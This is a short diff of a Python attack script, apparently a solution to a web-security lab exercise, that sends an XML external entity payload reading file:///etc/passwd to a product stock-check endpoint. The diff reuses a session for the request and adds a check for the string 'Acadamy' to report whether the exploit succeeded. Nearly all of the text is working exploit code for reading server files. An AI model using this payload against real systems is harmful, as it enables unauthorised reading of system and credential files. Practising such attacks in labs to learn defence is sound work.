@@ -9,9 +9,13 @@ def exploit_xxe(s,url):
     print('[+] Exploiting XXE Vulnerability...')
     stock_path = url + '/product/stock'
     exploit = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>'
-    r = requests.post(stock_path,data=exploit,verify=False,proxies=proxies)
+    r = s.post(stock_path,data=exploit,verify=False,proxies=proxies)
     print('[+] The following is the content of the /etc/passwd file:')
     print(r.text)
+    if 'Acadamy' in r.text:
+        print('[+]Exploit Successful')
+    else:
+        print('[-] Exploit Unsuccesful')
     sys.exit(-1)
 
 def main():
